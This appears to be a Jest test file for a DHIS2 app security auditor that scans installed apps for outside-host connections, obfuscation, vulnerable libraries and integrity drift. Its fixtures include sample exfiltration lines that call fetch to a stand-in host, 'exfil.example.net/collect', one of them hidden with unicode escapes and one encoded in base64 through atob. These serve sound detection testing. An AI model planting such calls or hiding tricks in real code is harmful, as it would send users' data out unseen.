import { installWebCrypto, removeWebCrypto } from '../../testUtils/webCrypto'
import { runAppsAudit } from './runAppsAudit'
import { __setAnalyzerForTests } from '../../utils/jsXRay'

// The shipped default: the code analysis is off, so most tests exercise the
// path a real instance takes.
const TEST_CONFIG = { maxAppAuditConcurrency: 4 }

// For the tests that are specifically about the analysis.
const ANALYSIS_ON = { ...TEST_CONFIG, enableCodeAnalysis: true }

const makeEngine = (apps) => ({
    query: jest.fn(async () => ({ apps })),
})

const makeFetchText = (filesByUrl) => async (url) => {
    if (!(url in filesByUrl)) {
        throw new Error(`HTTP 404 (no fixture for ${url})`)
    }
    return { text: filesByUrl[url], finalUrl: url }
}

const cleanAnalyze = () => ({ warnings: [], isMinified: false })

afterEach(() => __setAnalyzerForTests(null))

describe('runAppsAudit', () => {
    it('lists apps via /api/apps and scans each one', async () => {
        const engine = makeEngine([
            {
                key: 'app-one',
                name: 'App One',
                baseUrl: 'https://server/dhis/api/apps/app-one',
            },
            {
                key: 'app-two',
                name: 'App Two',
                baseUrl: 'https://server/dhis/api/apps/app-two',
            },
        ])
        const fetchText = makeFetchText({
            'https://server/dhis/api/apps/app-one/index.html?redirect=false':
                '<script src="main.js"></script>',
            'https://server/dhis/api/apps/app-one/main.js': 'console.log(1)',
            'https://server/dhis/api/apps/app-two/index.html?redirect=false':
                '<script src="main.js"></script>',
            'https://server/dhis/api/apps/app-two/main.js': 'console.log(2)',
        })
        const results = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
        })
        expect(results).toHaveLength(2)
        expect(results[0].app.key).toBe('app-one')
        expect(results[0].status).toBe('pass')
        expect(results[1].status).toBe('pass')
    })

    // End-to-end proof that the external-endpoint check survives the whole
    // chain: fileProcessor -> scanApp -> summarize -> resultStatus. The check
    // runs with the code analysis off, which is the shipped default, because
    // it works on raw text and needs no parser.
    it('flags an app that can connect to a host outside the instance', async () => {
        const engine = makeEngine([
            {
                key: 'sketchy',
                name: 'Sketchy',
                baseUrl: 'https://server/dhis/api/apps/sketchy',
            },
        ])
        const fetchText = makeFetchText({
            'https://server/dhis/api/apps/sketchy/index.html?redirect=false':
                '<script src="main.js"></script>',
            // Written the way an obfuscator would, to prove normalization is
            // part of the shipped path and not just of the unit tests.
            'https://server/dhis/api/apps/sketchy/main.js':
                'fetch("https:\\u002f\\u002fexfil.example.net/collect",{body:d})',
        })
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            fetchText,
            instanceHost: 'server',
        })
        expect(result.status).toBe('warning')
        expect(result.external.reachableCount).toBe(1)
        expect(result.external.hosts[0]).toMatchObject({
            host: 'exfil.example.net',
            reachable: true,
        })
        expect(result.external.sinks).toContain('fetch')
    })

    it('leaves an app that only talks to its own instance alone', async () => {
        const engine = makeEngine([
            {
                key: 'tidy',
                name: 'Tidy',
                baseUrl: 'https://server/dhis/api/apps/tidy',
            },
        ])
        const fetchText = makeFetchText({
            'https://server/dhis/api/apps/tidy/index.html?redirect=false':
                '<script src="main.js"></script>',
            'https://server/dhis/api/apps/tidy/main.js':
                'fetch("https://server/dhis/api/me");var ns="http://www.w3.org/2000/svg"',
        })
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            fetchText,
            instanceHost: 'server',
        })
        expect(result.status).toBe('pass')
        expect(result.external).toMatchObject({ status: 'pass', hosts: [] })
    })

    it('honors maxAppAuditConcurrency (no more than N in flight)', async () => {
        let active = 0
        let peak = 0
        const slowFetch = async (url) => {
            active += 1
            peak = Math.max(peak, active)
            await new Promise((r) => setTimeout(r, 5))
            active -= 1
            // Tiny index with no scripts so we only count the index.html fetch.
            return { text: '<html></html>', finalUrl: url }
        }
        const engine = makeEngine(
            Array.from({ length: 8 }, (_, i) => ({
                key: `a${i}`,
                baseUrl: `api/apps/a${i}`,
            }))
        )
        await runAppsAudit(
            engine,
            { maxAppAuditConcurrency: 3 },
            {},
            { analyze: cleanAnalyze, fetchText: slowFetch }
        )
        expect(peak).toBeLessThanOrEqual(3)
    })

    it('reports status: fail when an app contains obfuscated code', async () => {
        const engine = makeEngine([
            { key: 'evil', baseUrl: 'https://server/dhis/api/apps/evil' },
        ])
        const fetchText = makeFetchText({
            'https://server/dhis/api/apps/evil/index.html?redirect=false':
                '<script src="main.js"></script>',
            'https://server/dhis/api/apps/evil/main.js': 'eval("...")',
        })
        const obfuscatedAnalyze = () => ({
            warnings: [{ kind: 'obfuscated-code', value: 'jsfuck' }],
        })
        const [result] = await runAppsAudit(
            engine,
            ANALYSIS_ON,
            {},
            { analyze: obfuscatedAnalyze, fetchText }
        )
        expect(result.status).toBe('fail')
        expect(result.files[0].warnings[0].kind).toBe('obfuscated-code')
    })

    it('isolates per-app failures (one bad app does not abort the run)', async () => {
        const engine = makeEngine([
            { key: 'broken', baseUrl: 'https://server/dhis/api/apps/broken' },
            { key: 'ok', baseUrl: 'https://server/dhis/api/apps/ok' },
        ])
        const fetchText = async (url) => {
            if (url === 'https://server/dhis/api/apps/broken/index.html?redirect=false') {
                throw new Error('Network down')
            }
            return { text: '<html></html>', finalUrl: url }
        }
        const results = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
        })
        expect(results).toHaveLength(2)
        const broken = results.find((r) => r.app.key === 'broken')
        const ok = results.find((r) => r.app.key === 'ok')
        expect(broken.error).toMatch(/Network down/)
        expect(broken.status).toBe('error')
        // No <script src> in the stub index — reported as unscanned (info),
        // not as a clean pass.
        expect(ok.status).toBe('info')
        expect(ok.notScanned).toBe('no-entries')
    })

    it('emits the expected lifecycle callbacks', async () => {
        const events = []
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/dhis/api/apps/a' },
        ])
        const fetchText = makeFetchText({
            'https://server/dhis/api/apps/a/index.html?redirect=false': '<html></html>',
        })
        await runAppsAudit(
            engine,
            TEST_CONFIG,
            {
                onStartRun: ({ total }) => events.push(`startRun:${total}`),
                onAppStart: (app) => events.push(`appStart:${app.key}`),
                onAppDone: (app, result) =>
                    events.push(`appDone:${app.key}=${result.status}`),
                onProgress: ({ current, total }) =>
                    events.push(`progress:${current}/${total}`),
                onComplete: () => events.push('complete'),
            },
            { analyze: cleanAnalyze, fetchText }
        )
        expect(events).toEqual([
            'startRun:1',
            'appStart:a',
            'appDone:a=info',
            'progress:1/1',
            'complete',
        ])
    })

    it('resolves /absolute script srcs against the origin (not the app path)', async () => {
        // Regression: DHIS2 v42's unified app shell serves the same shell
        // HTML for every dhis-web-* path, with <script src="/assets/main-X.js">
        // (root-absolute). The scanner used to strip leading "/" and then
        // concat onto the app's path, producing a 404. The fix uses
        // new URL(src, base) which preserves the absolute path semantics.
        const engine = makeEngine([
            {
                key: 'core-app',
                name: 'Core App',
                baseUrl: 'https://server/dhis-web-core-app',
            },
        ])
        const requested = []
        const fetchText = async (url) => {
            requested.push(url)
            if (url === 'https://server/dhis-web-core-app/index.html?redirect=false') {
                return {
                    text: '<script src="/assets/main-DH0lLmwl.js"></script>',
                    finalUrl: url,
                }
            }
            if (url === 'https://server/assets/main-DH0lLmwl.js') {
                return { text: 'console.log(1)', finalUrl: url }
            }
            throw new Error(`HTTP 404 for ${url}`)
        }
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
        })
        // Confirm the script was fetched from the origin root, NOT from
        // /dhis-web-core-app/assets/...
        expect(requested).toContain('https://server/assets/main-DH0lLmwl.js')
        expect(result.status).toBe('pass')
        expect(result.files[0].error).toBeUndefined()
    })

    it('builds absolute paths via contextPath when app.baseUrl is missing', async () => {
        // Regression: previously the fallback used a relative URL
        // ("api/apps/<key>") which the browser resolved against the
        // security-auditor's own document URL, producing a 404 on any
        // instance mounted at a sub-path like /dhis. The fix is to use
        // the supplied contextPath to build an absolute path.
        const engine = makeEngine([
            // Note: no baseUrl on the app object.
            { key: 'no-base', name: 'No Base App' },
        ])
        const requested = []
        const fetchText = async (url) => {
            requested.push(url)
            return { text: '<html></html>', finalUrl: url }
        }
        await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
            contextPath: '/dhis',
        })
        expect(requested).toContain('/dhis/api/apps/no-base/index.html?redirect=false')
    })

    it('requests index.html with the global-shell bypass', async () => {
        // Regression: on DHIS2 2.42+, /api/apps/<key>/index.html answers
        // 302 -> /apps/<key>, which serves the *global shell's* index.html.
        // Every app then resolved to the same shell bundle, so all 45 apps on
        // an instance produced byte-identical findings drawn from the shell's
        // vendor code. ?redirect=false serves the app's own index.html.
        const engine = makeEngine([
            { key: 'dashboard', baseUrl: 'https://server/api/apps/dashboard' },
        ])
        const requested = []
        const fetchText = async (url) => {
            requested.push(url)
            return { text: '<html></html>', finalUrl: url }
        }
        await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
        })
        expect(requested[0]).toBe(
            'https://server/api/apps/dashboard/index.html?redirect=false'
        )
    })

    it('refuses to analyze a document the server redirected us to', async () => {
        // Belt and braces for instances that redirect regardless of the
        // bypass parameter: if the final URL leaves the app's directory we
        // are looking at the shell (or a login page), not the app. Analyzing
        // it would attribute the shell's code to this app.
        const engine = makeEngine([
            { key: 'dashboard', baseUrl: 'https://server/api/apps/dashboard' },
        ])
        const fetchText = async (url) => {
            if (url.startsWith('https://server/api/apps/dashboard/index.html')) {
                return {
                    text: '<script src="./assets/shell.js"></script>',
                    finalUrl: 'https://server/apps/dashboard',
                }
            }
            return { text: 'console.log(1)', finalUrl: url }
        }
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText,
        })
        expect(result.notScanned).toBe('shell-redirect')
        expect(result.files).toEqual([])
        expect(result.status).toBe('info')
        expect(result.note).toMatch(/app shell was served/)
    })

    it('scans normally on pre-2.42 instances, which ignore the bypass', async () => {
        // Verified against the public play instances: on 2.40.12 and 2.41.9
        // the app's index.html answers 200 directly and ?redirect=false is an
        // unknown parameter that the server ignores. /api/apps reports the
        // legacy /dhis-web-<name> path as baseUrl on those versions, so that
        // is the shape exercised here. The redirect guard must not fire.
        const engine = makeEngine([
            {
                key: 'dashboard',
                baseUrl: 'https://server/dhis-web-dashboard',
            },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText: makeFetchText({
                'https://server/dhis-web-dashboard/index.html?redirect=false':
                    '<script src="./assets/main-JWFjH4Vq.js"></script>',
                'https://server/dhis-web-dashboard/assets/main-JWFjH4Vq.js':
                    'console.log(1)',
            }),
        })
        expect(result.notScanned).toBeUndefined()
        expect(result.status).toBe('pass')
        expect(result.files).toHaveLength(1)
    })

    it('names an expired session rather than blaming the app shell', async () => {
        // A session expiring mid-run redirects every remaining app to the
        // login page. Reporting that as a shell redirect would send an admin
        // looking in the wrong place.
        const engine = makeEngine([
            { key: 'dashboard', baseUrl: 'https://server/dhis-web-dashboard' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText: async () => ({
                text: '<script src="./assets/login.js"></script>',
                finalUrl: 'https://server/dhis-web-login/',
            }),
        })
        expect(result.notScanned).toBe('login-redirect')
        expect(result.note).toMatch(/session has probably expired/)
    })

    it('follows modulepreload links and lazy-chunk imports', async () => {
        // Vite splits an app across chunks. On several DHIS2 apps the entry
        // is a ~1 KB stub and the real 600 KB bundle is reachable only via
        // <link rel="modulepreload"> or an import specifier inside the JS.
        const engine = makeEngine([
            { key: 'maps', baseUrl: 'https://server/api/apps/maps' },
        ])
        const files = {
            'https://server/api/apps/maps/index.html?redirect=false':
                '<script src="./assets/main.js"></script>' +
                '<link rel="modulepreload" href="./assets/index-abc.js">',
            'https://server/api/apps/maps/assets/main.js':
                'import"./index-abc.js";const d=["./AppWrapper-xyz.js"];',
            'https://server/api/apps/maps/assets/index-abc.js': 'export const a=1',
            'https://server/api/apps/maps/assets/AppWrapper-xyz.js': 'export const b=2',
        }
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText: makeFetchText(files),
        })
        expect(result.status).toBe('pass')
        // Entry + modulepreload + the lazy chunk named in the deps array.
        expect(result.files.map((f) => f.src).sort()).toEqual([
            './AppWrapper-xyz.js',
            './assets/index-abc.js',
            './assets/main.js',
        ])
    })

    it('does not blame the app for an unfetchable discovered specifier', async () => {
        // The crawler finds specifiers by scanning string literals, so it can
        // pick up something that only looks like a module path. That must
        // cost one 404, not an error finding against the app.
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js': 'const s="./not-real.js"',
            }),
        })
        expect(result.status).toBe('pass')
        const ghost = result.files.find((f) => f.src === './not-real.js')
        expect(ghost.error).toBeUndefined()
        expect(ghost.skipped).toBeTruthy()
    })

    it('skips a path that answers with HTML instead of JavaScript', async () => {
        // Regression: DHIS2 answers a missing app path with an HTML page, not
        // a 404. Handing that to the analyzer raised "Unexpected token '<'"
        // and marked the whole app as errored.
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js':
                    'const p="./vendor/jquery-3.3.1.min.js"',
                'https://server/api/apps/a/vendor/jquery-3.3.1.min.js':
                    '<!DOCTYPE html><html><body>Not found</body></html>',
            }),
        })
        expect(result.status).toBe('pass')
        const vendor = result.files.find((f) => f.src.includes('jquery'))
        expect(vendor.error).toBeUndefined()
        expect(vendor.skipped).toMatch(/did not return JavaScript/)
    })

    it('does not fail an app for vendor globalThis shims or minification', async () => {
        // The finding set every DHIS2 bundle produces: lodash's
        // Function("return this"), i18next's "added" event name, and the
        // minifier's short identifiers. None of it should fail an app.
        const engine = makeEngine([
            { key: 'normal', baseUrl: 'https://server/api/apps/normal' },
        ])
        const source = 'var g=typeof self=="object"?self:Function("return this")();'
        const vendorAnalyze = () => ({
            warnings: [
                {
                    kind: 'unsafe-stmt',
                    value: 'Function',
                    location: [1, source.indexOf('Function')],
                },
                { kind: 'encoded-literal', value: 'added' },
                { kind: 'short-identifiers', value: 1.39 },
            ],
        })
        const [result] = await runAppsAudit(engine, ANALYSIS_ON, {}, {
            analyze: vendorAnalyze,
            fetchText: makeFetchText({
                'https://server/api/apps/normal/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/normal/main.js': source,
            }),
        })
        // Clean verdict — the surviving finding is still listed for a human,
        // but informational kinds never bump the status.
        expect(result.status).toBe('pass')
        // The two attributable vendor patterns are suppressed outright.
        expect(result.files[0].warnings.map((w) => w.kind)).toEqual([
            'short-identifiers',
        ])
    })

    it('applies the configured scan limits and reports what they skipped', async () => {
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(
            engine,
            { ...TEST_CONFIG, maxAppFilesScanned: 2, maxAppFileMb: 1 },
            {},
            {
                analyze: cleanAnalyze,
                fetchText: makeFetchText({
                    'https://server/api/apps/a/index.html?redirect=false':
                        '<script src="./main.js"></script>',
                    'https://server/api/apps/a/main.js':
                        'import"./b.js";import"./c.js";import"./d.js"',
                    'https://server/api/apps/a/b.js': 'x'.repeat(2 * 1024 * 1024),
                    'https://server/api/apps/a/c.js': 'const c=1',
                    'https://server/api/apps/a/d.js': 'const d=1',
                }),
            }
        )
        // Two files scanned, then the cap; the remainder is reported rather
        // than dropped silently.
        expect(result.files).toHaveLength(3)
        expect(result.files[1].skipped).toMatch(/exceeds size limit/)
        expect(result.files[2].skipped).toMatch(/crawl limit reached/)
    })

    it('fails an app whose code changed without a version change', async () => {
        const restore = installWebCrypto()
        try {
            const engine = makeEngine([
                {
                    key: 'dashboard',
                    version: '1.0.0',
                    baseUrl: 'https://server/dhis-web-dashboard',
                },
            ])
            const fetchText = makeFetchText({
                'https://server/dhis-web-dashboard/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/dhis-web-dashboard/main.js': 'console.log("tampered")',
            })
            // Baseline recorded a different hash for the same version.
            const baseline = {
                apps: {
                    dashboard: {
                        version: '1.0.0',
                        files: { './main.js': 'a'.repeat(64) },
                    },
                },
            }
            const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
                analyze: cleanAnalyze,
                fetchText,
                baseline,
            })
            expect(result.integrity.state).toBe('drift')
            expect(result.integrity.changed).toEqual(['./main.js'])
            // Drift outranks a clean analyzer result.
            expect(result.status).toBe('fail')
        } finally {
            restore()
        }
    })

    it('passes an app that matches its baseline', async () => {
        const restore = installWebCrypto()
        try {
            const engine = makeEngine([
                {
                    key: 'dashboard',
                    version: '1.0.0',
                    baseUrl: 'https://server/dhis-web-dashboard',
                },
            ])
            const fetchText = makeFetchText({
                'https://server/dhis-web-dashboard/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/dhis-web-dashboard/main.js': 'console.log(1)',
            })
            const opts = { analyze: cleanAnalyze, fetchText }
            // First run records what is there; second run compares to it.
            const [first] = await runAppsAudit(engine, TEST_CONFIG, {}, opts)
            expect(first.integrity.state).toBe('new')

            const baseline = {
                apps: {
                    dashboard: {
                        version: '1.0.0',
                        files: { './main.js': first.files[0].hash },
                    },
                },
            }
            const [second] = await runAppsAudit(engine, TEST_CONFIG, {}, {
                ...opts,
                baseline,
            })
            expect(second.integrity.state).toBe('unchanged')
            expect(second.status).toBe('pass')
        } finally {
            restore()
        }
    })

    it('hashes a file that was too large to analyze', async () => {
        // Integrity and analysis answer different questions; capture's 6.4 MB
        // chunk is unparseable here but must still be covered by the baseline.
        const restore = installWebCrypto()
        try {
            const engine = makeEngine([
                { key: 'a', baseUrl: 'https://server/api/apps/a' },
            ])
            const [result] = await runAppsAudit(
                engine,
                { ...TEST_CONFIG, maxAppFileMb: 1 },
                {},
                {
                    analyze: cleanAnalyze,
                    fetchText: makeFetchText({
                        'https://server/api/apps/a/index.html?redirect=false':
                            '<script src="./big.js"></script>',
                        'https://server/api/apps/a/big.js': 'x'.repeat(2 * 1024 * 1024),
                    }),
                }
            )
            expect(result.files[0].skipped).toMatch(/exceeds size limit/)
            expect(result.files[0].hash).toMatch(/^[0-9a-f]{64}$/)
        } finally {
            restore()
        }
    })

    it('reports integrity as unknown when hashing is unavailable', async () => {
        const restore = removeWebCrypto()
        try {
            const engine = makeEngine([
                { key: 'a', baseUrl: 'https://server/api/apps/a' },
            ])
            const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
                analyze: cleanAnalyze,
                fetchText: makeFetchText({
                    'https://server/api/apps/a/index.html?redirect=false':
                        '<script src="./main.js"></script>',
                    'https://server/api/apps/a/main.js': 'console.log(1)',
                }),
            })
            expect(result.integrity.state).toBe('unknown')
            // Not knowing must not be reported as a failure.
            expect(result.status).toBe('pass')
        } finally {
            restore()
        }
    })

    it('fails an app that bundles a known-vulnerable library', async () => {
        const engine = makeEngine([
            { key: 'a', version: '1.0.0', baseUrl: 'https://server/api/apps/a' },
        ])
        const retireRepository = {
            retrievedAt: '2026-08-05',
            components: {
                lodash: {
                    extractors: {
                        filecontentreplace: [
                            '/VERSION *= *[\'"]([0-9][0-9.a-z_\\-]+)[\'"]/$1/',
                        ],
                    },
                    vulnerabilities: [
                        {
                            below: '4.18.0',
                            severity: 'high',
                            identifiers: { CVE: ['CVE-2021-23337'] },
                        },
                    ],
                },
            },
        }
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze: cleanAnalyze,
            retireRepository,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js': 'var VERSION="4.17.21";',
            }),
        })
        // The analyzer reported nothing; the library finding sets the verdict.
        expect(result.status).toBe('fail')
        const [library] = result.files[0].libraries
        expect(library).toMatchObject({ component: 'lodash', version: '4.17.21' })
        expect(library.vulnerabilities[0].identifiers.CVE).toEqual([
            'CVE-2021-23337',
        ])
    })

    it('reports the signature date so a clean result can be weighed', async () => {
        const onRetireRepository = jest.fn()
        await runAppsAudit(
            makeEngine([{ key: 'a', baseUrl: 'https://server/api/apps/a' }]),
            TEST_CONFIG,
            { onRetireRepository },
            {
                analyze: cleanAnalyze,
                retireRepository: { retrievedAt: '2026-08-05', components: {} },
                fetchText: async (url) => ({ text: '<html></html>', finalUrl: url }),
            }
        )
        expect(onRetireRepository).toHaveBeenCalledWith({
            retrievedAt: '2026-08-05',
        })
    })

    it('keeps auditing when the signature data cannot be loaded', async () => {
        // Losing the library check must not cost us the AST analysis or the
        // integrity baseline — and the gap has to be reported, not assumed
        // clean.
        const onRetireRepository = jest.fn()
        const [result] = await runAppsAudit(
            makeEngine([{ key: 'a', baseUrl: 'https://server/api/apps/a' }]),
            TEST_CONFIG,
            { onRetireRepository },
            {
                analyze: cleanAnalyze,
                retireRepository: null,
                fetchText: makeFetchText({
                    'https://server/api/apps/a/index.html?redirect=false':
                        '<script src="./main.js"></script>',
                    'https://server/api/apps/a/main.js': 'var VERSION="4.17.21";',
                }),
            }
        )
        expect(result.status).toBe('pass')
        expect(result.files[0].libraries).toEqual([])
        expect(onRetireRepository).toHaveBeenCalledWith({ unavailable: true })
    })

    it('abandons a crawl after a run of unfetchable discovered paths', async () => {
        // moment.js's locale table is a list of paths that are not modules of
        // the app at all. Following it produced 118 requests for one app and
        // 856 candidates for another, every one a 404. Measured across eight
        // apps, a real module never appeared after even one dead end.
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const locales = [
            './af.js',
            './ar-dz.js',
            './bg.js',
            './bn.js',
            './cs.js',
            './da.js',
            './el.js',
            './fi.js',
        ]
        const requested = []
        const fetchText = async (url) => {
            requested.push(url)
            if (url.endsWith('index.html?redirect=false')) {
                return {
                    text: '<script src="./main.js"></script>',
                    finalUrl: url,
                }
            }
            if (url.endsWith('/main.js')) {
                return {
                    text: locales.map((l) => `"${l}"`).join(','),
                    finalUrl: url,
                }
            }
            throw new Error('HTTP 404')
        }
        const [result] = await runAppsAudit(
            engine,
            { ...TEST_CONFIG, maxConsecutiveUnfetchable: 3 },
            {},
            { analyze: cleanAnalyze, fetchText }
        )
        // Three dead ends tried, then the crawl stops — not all eight.
        const localeRequests = requested.filter((u) => u.includes('/af.js') || /\/(ar-dz|bg|bn|cs|da|el|fi)\.js$/.test(u))
        expect(localeRequests).toHaveLength(3)
        const summary = result.files[result.files.length - 1]
        expect(summary.skipped).toMatch(/in a row could not be fetched/)
        expect(result.status).toBe('pass')
    })

    it('keeps crawling when dead ends are interleaved with real modules', async () => {
        // The counter has to reset on success, or an app with a couple of
        // stale references scattered through a large graph would be cut off.
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const fetchText = async (url) => {
            if (url.endsWith('index.html?redirect=false')) {
                return { text: '<script src="./main.js"></script>', finalUrl: url }
            }
            if (url.endsWith('/main.js')) {
                return { text: '"./gone1.js","./real.js","./gone2.js"', finalUrl: url }
            }
            if (url.endsWith('/real.js')) {
                return { text: 'const ok=1', finalUrl: url }
            }
            throw new Error('HTTP 404')
        }
        const [result] = await runAppsAudit(
            engine,
            { ...TEST_CONFIG, maxConsecutiveUnfetchable: 2 },
            {},
            { analyze: cleanAnalyze, fetchText }
        )
        expect(result.files.map((f) => f.src)).toContain('./real.js')
        expect(result.status).toBe('pass')
    })

    it('runs in-thread when no Worker is available', async () => {
        // jsdom has no Worker, so this is the fallback path — the same code
        // the browser runs when a CSP forbids workers.
        const onWorker = jest.fn()
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(engine, ANALYSIS_ON, { onWorker }, {
            analyze: cleanAnalyze,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js': 'console.log(1)',
            }),
        })
        expect(onWorker).toHaveBeenCalledWith({ active: false })
        expect(result.status).toBe('pass')
        expect(result.files[0].warnings).toEqual([])
    })

    it('accepts an injected processor and reports its analyzer failures', async () => {
        // The worker returns analyzer failures as data rather than throwing,
        // so a crash on one file costs that file's warnings and nothing else.
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const processFile = jest.fn(async () => ({
            hash: 'abc',
            libraries: [],
            imports: [],
            analyzeError: "Cannot read properties of undefined (reading 'type')",
        }))
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            processFile,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js': 'console.log(1)',
            }),
        })
        expect(processFile).toHaveBeenCalled()
        expect(result.files[0].error).toMatch(/Analyzer failed/)
        expect(result.files[0].hash).toBe('abc')
        // A parse failure is missing information, not a finding: it marks the
        // scan incomplete rather than changing the assessment.
        expect(result.files[0].incomplete).toBe(true)
        expect(result.status).toBe('pass')
    })

    it('skips the code analysis by default, keeping the checks that matter', async () => {
        // Off by default: on minified bundles the analysis cannot support a
        // verdict, and it is the dominant cost of a scan. Library detection
        // and hashing need no parser and are unaffected.
        const analyze = jest.fn(() => ({
            warnings: [{ kind: 'obfuscated-code', value: 'jsfuck' }],
        }))
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            analyze,
            retireRepository: {
                components: {
                    lodash: {
                        extractors: {
                            filecontentreplace: [
                                '/VERSION *= *[\'"]([0-9][0-9.a-z_\\-]+)[\'"]/$1/',
                            ],
                        },
                        vulnerabilities: [
                            { below: '4.18.0', severity: 'high', identifiers: {} },
                        ],
                    },
                },
            },
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js': 'var VERSION="4.17.21";',
            }),
        })
        expect(analyze).not.toHaveBeenCalled()
        expect(result.files[0].warnings).toBeUndefined()
        // Not a gap: nothing was meant to be examined, so the app is not
        // reported as partially examined.
        expect(result.files[0].incomplete).toBeUndefined()
        // The library check still ran, and still sets the verdict.
        expect(result.files[0].libraries[0].component).toBe('lodash')
        expect(result.status).toBe('fail')
    })

    it('recovers a URL hidden in an encoded string', async () => {
        // The case no text scan can reach: the host exists nowhere in the
        // file as readable text. Measured on three real bundles, decoding
        // produced zero hits, so a hit means the string was deliberately
        // hidden.
        const { parseModule, parseScript } = await import('meriyah')
        const parse = (src) => {
            try {
                return parseModule(src, { next: true })
            } catch {
                return parseScript(src, { next: true })
            }
        }
        const hidden = Buffer.from(
            'https://exfil.example.net/collect',
            'utf8'
        ).toString('base64')
        const engine = makeEngine([
            { key: 'sneaky', baseUrl: 'https://server/api/apps/sneaky' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            parse,
            fetchText: makeFetchText({
                'https://server/api/apps/sneaky/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/sneaky/main.js': `fetch(atob("${hidden}"),{body:d})`,
            }),
            instanceHost: 'server',
        })
        const host = result.external.hosts.find(
            (h) => h.host === 'exfil.example.net'
        )
        expect(host).toBeDefined()
        expect(host.decoded).toBe(true)
        // Hidden and beside a fetch call: not an observation.
        expect(host.reachable).toBe(true)
        expect(result.status).toBe('fail')
    })

    it('only counts connection APIs that are really called', async () => {
        // Regex reports a sink for the word `fetch` in a string. Measured on
        // the dashboard bundle, that produced a false XMLHttpRequest claim.
        const { parseModule, parseScript } = await import('meriyah')
        const parse = (src) => {
            try {
                return parseModule(src, { next: true })
            } catch {
                return parseScript(src, { next: true })
            }
        }
        const engine = makeEngine([
            { key: 'a', baseUrl: 'https://server/api/apps/a' },
        ])
        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
            parse,
            fetchText: makeFetchText({
                'https://server/api/apps/a/index.html?redirect=false':
                    '<script src="./main.js"></script>',
                'https://server/api/apps/a/main.js':
                    'const help="use fetch(url) or XMLHttpRequest";indexedDB.open("db")',
            }),
            instanceHost: 'server',
        })
        expect(result.external.sinks).toEqual([])
    })

    it('handles a /api/apps fetch failure without throwing', async () => {
        const engine = {
            query: jest.fn(() => Promise.reject(new Error('forbidden'))),
        }
        const onListFailed = jest.fn()
        const onComplete = jest.fn()
        const results = await runAppsAudit(
            engine,
            TEST_CONFIG,
            { onListFailed, onComplete },
            { analyze: cleanAnalyze }
        )
        expect(results).toEqual([])
        expect(onListFailed).toHaveBeenCalledWith(expect.any(Error))
        expect(onComplete).toHaveBeenCalledWith([])
    })
})
